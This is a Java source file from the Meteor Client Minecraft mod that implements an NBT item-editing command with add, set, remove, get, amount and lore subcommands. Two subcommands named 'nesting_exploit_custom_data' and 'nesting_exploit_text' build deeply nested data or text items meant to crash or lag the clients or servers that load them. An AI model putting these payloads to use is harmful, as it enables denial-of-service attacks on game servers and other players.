/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.commands.commands;

import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.exceptions.SimpleCommandExceptionType;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.ComponentMapArgumentType;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.InventoryUtils;
import meteordevelopment.meteorclient.utils.text.MeteorClickEvent;
import meteordevelopment.meteorclient.utils.text.TextUtils;
import net.minecraft.block.entity.BlockEntity;
import net.minecraft.client.gui.hud.ChatHud;
import net.minecraft.command.CommandSource;
import net.minecraft.command.argument.RegistryKeyArgumentType;
import net.minecraft.component.*;
import net.minecraft.component.type.LoreComponent;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtElement;
import net.minecraft.nbt.NbtHelper;
import net.minecraft.nbt.NbtList;
import net.minecraft.registry.Registries;
import net.minecraft.registry.RegistryKey;
import net.minecraft.registry.RegistryKeys;
import net.minecraft.storage.NbtWriteView;
import net.minecraft.text.HoverEvent;
import net.minecraft.text.MutableText;
import net.minecraft.text.Style;
import net.minecraft.text.Text;
import net.minecraft.util.ErrorReporter;
import net.minecraft.util.Formatting;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.math.BlockPos;

import java.util.*;

public class NBTCommand extends Command {
    
    private static final SimpleCommandExceptionType NOT_HAVE_NBT = new SimpleCommandExceptionType(Text.literal("That item does not have NBT."));
    private static final SimpleCommandExceptionType NOT_BLOCK_ENTITY = new SimpleCommandExceptionType(Text.literal("That block is not a block entity."));
    
    public NBTCommand() {
        super("NBT", "NBT data tools for an item, example: .nbt add [minecraft:item_name=\"Test\"]'");
    }
    
    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("add")
            .then(argument("component", ComponentMapArgumentType.componentMap(REGISTRY_ACCESS))
                .executes(context -> {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    
                    if (validBasic(stack)) {
                        ComponentMap itemComponents = stack.getComponents();
                        ComponentMap newComponents = ComponentMapArgumentType.get(context, "component");
                        ComponentMap testComponents = ComponentMap.of(itemComponents, newComponents);
                        
                        stack.applyComponentsFrom(testComponents);
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                    }
                    
                    return SINGLE_SUCCESS;
                })
            )
        );
        
        builder.then(literal("set")
            .then(argument("component", ComponentMapArgumentType.componentMap(REGISTRY_ACCESS))
                .executes(context -> {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    
                    if (validBasic(stack)) {
                        ComponentMap components = ComponentMapArgumentType.get(context, "component");
                        MergedComponentMap stackComponents = (MergedComponentMap) stack.getComponents();
                        
                        ComponentChanges.Builder changesBuilder = ComponentChanges.builder();
                        Set<ComponentType<?>> types = stackComponents.getTypes();
                        
                        // Set changes
                        for (Component<?> entry : components) {
                            changesBuilder.add(entry);
                            types.remove(entry.type());
                        }
                        
                        // Remove the rest
                        for (ComponentType<?> type : types) {
                            changesBuilder.remove(type);
                        }
                        
                        stackComponents.applyChanges(changesBuilder.build());
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                    }
                    
                    return SINGLE_SUCCESS;
                })
            )
        );
        
        builder.then(literal("remove")
            .then(argument("component", RegistryKeyArgumentType.registryKey(RegistryKeys.DATA_COMPONENT_TYPE))
                .executes(context -> {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    
                    if (validBasic(stack)) {
                        @SuppressWarnings("unchecked")
                        RegistryKey<ComponentType<?>> componentTypeKey = (RegistryKey<ComponentType<?>>) context.getArgument("component", RegistryKey.class);
                        ComponentType<?> componentType = Registries.DATA_COMPONENT_TYPE.get(componentTypeKey);
                        
                        MergedComponentMap components = (MergedComponentMap) stack.getComponents();
                        components.applyChanges(ComponentChanges.builder().remove(componentType).build());
                        
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                    }
                    
                    return SINGLE_SUCCESS;
                })
                .suggests((context, suggestionsBuilder) -> {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    if (stack != ItemStack.EMPTY) {
                        ComponentMap components = stack.getComponents();
                        String remaining = suggestionsBuilder.getRemaining().toLowerCase(Locale.ROOT);
                        
                        CommandSource.forEachMatching(
                            components.getTypes().stream()
                                .map(Registries.DATA_COMPONENT_TYPE::getEntry)
                                .toList(),
                            remaining,
                            entry -> {
                                if (entry.getKey().isPresent()) {
                                    return entry.getKey().get().getValue();
                                }
                                return null;
                            },
                            entry -> {
                                ComponentType<?> dataComponentType = entry.value();
                                if (dataComponentType.getCodec() != null && entry.getKey().isPresent()) {
                                    suggestionsBuilder.suggest(entry.getKey().get().getValue().toString());
                                }
                            }
                        );
                    }
                    
                    return suggestionsBuilder.buildFuture();
                })
            )
        );
        
        builder.then(literal("get")
            .executes(context -> {
                String nbtString;
                MutableText nbtText;
                String prefix;
                
                if (!mc.player.getInventory().getSelectedStack().isEmpty()) {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    
                    Optional<NbtElement> stackNbtOptional = Utils.encodeToNbt(stack).result();
                    // Is modified or has NBT
                    if (stack.getComponentChanges().isEmpty()
                        || stackNbtOptional.isEmpty()
                        || !(stackNbtOptional.get() instanceof NbtCompound nbt)
                        || !nbt.contains("components")
                    ) {
                        throw NOT_HAVE_NBT.create();
                    }
                    
                    nbtString = toFormatedComponent(nbt.getCompoundOrEmpty("components"), false).getString();
                    nbtText = nbtToText(nbt, nbtString);
                    prefix = stack.getItem().toString();
                } else {
                    switch (mc.crosshairTarget.getType()) {
                        case ENTITY -> {
                            Entity entity = ((EntityHitResult) mc.crosshairTarget).getEntity();
                            NbtWriteView view = NbtWriteView.create(ErrorReporter.EMPTY, mc.player.getRegistryManager());
                            entity.writeData(view);
                            nbtString = view.getNbt().toString();
                            nbtText = (MutableText) NbtHelper.toPrettyPrintedText(view.getNbt());
                            prefix = entity.isPlayer() ? ((PlayerEntity) entity).getGameProfile().name() : Registries.ENTITY_TYPE.getId(entity.getType()).toString();
                        }
                        
                        case BLOCK -> {
                            BlockPos blockPos = ((BlockHitResult) mc.crosshairTarget).getBlockPos();
                            BlockEntity blockEntity = mc.world.getBlockEntity(blockPos);
                            
                            if (blockEntity == null) {
                                throw NOT_BLOCK_ENTITY.create();
                            }
                            
                            NbtWriteView view = NbtWriteView.create(ErrorReporter.EMPTY, mc.player.getRegistryManager());
                            blockEntity.writeFullData(view);
                            nbtString = view.getNbt().toString();
                            nbtText = (MutableText) NbtHelper.toPrettyPrintedText(view.getNbt());
                            prefix = Registries.BLOCK_ENTITY_TYPE.getId(blockEntity.getType()).toString();
                        }
                        
                        case MISS -> {
                            NbtWriteView view = NbtWriteView.create(ErrorReporter.EMPTY, mc.player.getRegistryManager());
                            mc.player.writeData(view);
                            nbtString = view.getNbt().toString();
                            nbtText = (MutableText) NbtHelper.toPrettyPrintedText(view.getNbt());
                            prefix = mc.player.getGameProfile().name();
                        }
                        
                        default -> {
                            return 0;
                        }
                    }
                }
                
                final int MAX_HOVER_LENGTH = 15000;
                String nbtStringHover = nbtString;
                nbtString = TextUtils.removeUnpairedMultibyte(nbtString);
                int nbtLength = nbtString.length();
                
                // If the hover text is too long it gives a lot of lag with cursor over it (and doesn't fit on the screen)
                if (nbtLength > MAX_HOVER_LENGTH) {
                    nbtStringHover = "..." + nbtStringHover.substring(nbtLength - MAX_HOVER_LENGTH, nbtLength);
                }
                
                Text length = Text.literal(String.valueOf(nbtLength))
                    .formatted(Formatting.WHITE);
                MutableText lengthMessage = Text.literal("Length: ")
                    .formatted(Formatting.GRAY)
                    .append(length);
                
                MutableText message = nbtChatMessageOf(prefix, nbtText, nbtString, nbtStringHover);
                
                info(message.append("\n").append(lengthMessage));
                return SINGLE_SUCCESS;
            })
        );
        
        builder.then(literal("amount")
            .then(argument("amount", IntegerArgumentType.integer(-127, 127))
                .executes(context -> {
                    ItemStack stack = mc.player.getInventory().getSelectedStack();
                    
                    if (validBasic(stack)) {
                        int count = IntegerArgumentType.getInteger(context, "amount");
                        stack.setCount(count);
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                        info("Set mainhand stack amount to (highlight)%s(default).", count);
                    }
                    
                    return SINGLE_SUCCESS;
                })
            )
        );
        
        builder.then(literal("paste_lore")
            .executes(context -> {
                pasteLore(
                    16777215,
                    false,
                    false
                );
                return SINGLE_SUCCESS;
            })
            .then(argument("color", IntegerArgumentType.integer(0, 16777215))
                .executes(context -> {
                    pasteLore(
                        IntegerArgumentType.getInteger(context, "color"),
                        false,
                        false
                    );
                    return SINGLE_SUCCESS;
                })
                .then(argument("bold", BoolArgumentType.bool())
                    .executes(context -> {
                        pasteLore(
                            IntegerArgumentType.getInteger(context, "color"),
                            BoolArgumentType.getBool(context, "bold"),
                            false
                        );
                        return SINGLE_SUCCESS;
                    })
                    .then(argument("italic", BoolArgumentType.bool())
                        .executes(context -> {
                            pasteLore(
                                IntegerArgumentType.getInteger(context, "color"),
                                BoolArgumentType.getBool(context, "bold"),
                                BoolArgumentType.getBool(context, "italic")
                            );
                            return SINGLE_SUCCESS;
                        })
                    )
                )
            )
        );
        
        builder.then(literal("nesting_exploit_custom_data")
            .then(argument("depth", IntegerArgumentType.integer(0))
                .executes(context -> {
                    ItemStack stack = mc.player.getMainHandStack();
                    if (validBasic(stack)) {
                        
                        NbtCompound nbt = new NbtCompound();
                        nbt.put("§4§l§n§k" + randomChars(1337), buildRecursiveList(IntegerArgumentType.getInteger(context, "depth"), 0));
                        
                        stack.applyComponentsFrom(ComponentMap.builder()
                            .add(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt))
                            .build()
                        );
                        
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                    }
                    return SINGLE_SUCCESS;
                })
            )
        );
        
        builder.then(literal("nesting_exploit_text")
            .then(argument("depth", IntegerArgumentType.integer(0))
                .executes(context -> {
                    ItemStack stack = mc.player.getMainHandStack();
                    if (validBasic(stack)) {
                        stack.applyComponentsFrom(ComponentMap.builder()
                            .add(DataComponentTypes.ITEM_NAME, buildRecursiveText(IntegerArgumentType.getInteger(context, "depth"), 0))
                            .build()
                        );
                        
                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
                    }
                    return SINGLE_SUCCESS;
                })
            )
        );
    }
    
    private NbtList buildRecursiveList(int depth, int currentDepth) {
        NbtList list = new NbtList();
        
        if (currentDepth >= depth) {
            return list;
        }
        
        list.add(buildRecursiveList(depth, currentDepth + 1));
        
        return list;
    }
    
    private Text buildRecursiveText(int depth, int currentDepth) {
        MutableText text = Text.literal("§");
        
        if (currentDepth >= depth) {
            return text;
        }
        
        text.append(buildRecursiveText(depth, currentDepth + 1));
        
        return text;
    }
    
    private String randomChars(int length) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder();
        
        for (int i = 0; i < length; i++) {
            sb.append((char) random.nextInt(1024, 32768));
        }
        
        return sb.toString();
    }
    
    private void pasteLore(int color, boolean bold, boolean italic) {
        ItemStack stack = mc.player.getInventory().getSelectedStack();
        
        String data = mc.keyboard.getClipboard().replace("\r", "");
        String[] lines = data.split("\n");
        
        List<Text> lore = Arrays.stream(lines)
            .map(Text::literal)
            .map(line -> Text.of(line.setStyle(Style.EMPTY
                .withColor(color)
                .withBold(bold)
                .withItalic(italic)
            )))
            .toList();
        
        stack.applyComponentsFrom(ComponentMap.builder()
            .add(DataComponentTypes.LORE, new LoreComponent(lore))
            .build()
        );
        
        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
    }
    
    private boolean validBasic(ItemStack stack) {
        if (!mc.player.getAbilities().creativeMode) {
            error("Creative mode only.");
            return false;
        }
        
        if (stack == ItemStack.EMPTY) {
            error("You must hold an item in your main hand.");
            return false;
        }
        
        return true;
    }
    
    /**
     * Check if the message length fits within 90% of the maximum chat lines in vanilla
     * in order to avoid writing a message too long which could cause crash with mods
     * that increase the limit beyond vanilla (and lag spike in vanilla)
     * <p>
     * Note: the final result could be more than 90% due to formatting adding spaces.
     */
    private MutableText nbtToText(NbtCompound nbt, String nbtString) {
        final int MAX_CHAT_LINES = 90; // vanilla chat lines = 100
        if (mc.textRenderer.getWidth(nbtString) > ChatHud.getWidth(mc.options.getChatWidth().getValue()) * MAX_CHAT_LINES) {
            String message = String.format("[%s]", Text.literal("Nbt too long for chat").getString());
            return Text.literal(message).formatted(Formatting.WHITE);
        } else {
            return toFormatedComponent(nbt.getCompoundOrEmpty("components"), true);
        }
    }
    
    private MutableText nbtChatMessageOf(String prefix, MutableText nbtMessage, String nbtString, String nbtStringHover) {
        Text clickToCopyMessage = Text.literal(" (")
            .append(Text.literal("Click to copy"))
            .append(")")
            .formatted(Formatting.GRAY);
        
        return Text.literal(prefix)
            .formatted(Formatting.WHITE)
            .append(nbtMessage.copy().append(clickToCopyMessage)
                .setStyle(nbtMessage.getStyle()
                    .withClickEvent(new MeteorClickEvent.CopyToClipboard(nbtString))
                    .withHoverEvent(new HoverEvent.ShowText(Text.literal(nbtStringHover)))
                )
            );
    }
    
    public static MutableText toFormatedComponent(NbtCompound nbt, boolean prettyPrint) {
        MutableText result = Text.literal("[");
        List<Text> componentsText = new ArrayList<>(nbt.getKeys().size());
        
        for (var key : nbt.getKeys()) {
            MutableText text = Text.empty();
            NbtElement tag = nbt.get(key);
            
            if (tag == null) {
                tag = new NbtCompound();
            }
            
            text.append(Text.literal(key).setStyle(Style.EMPTY.withFormatting(Formatting.DARK_AQUA)));
            text.append(Text.literal("="));
            if (prettyPrint) {
                text.append(NbtHelper.toPrettyPrintedText(tag));
            } else {
                text.append(tag.toString());
            }
            
            componentsText.add(text);
        }
        
        for (int i = 0; i != componentsText.size(); i++) {
            result.append(componentsText.get(i));
            
            if (i != componentsText.size() - 1) {
                result.append(", ");
            }
        }
        
        return result.append("]");
    }
    
}
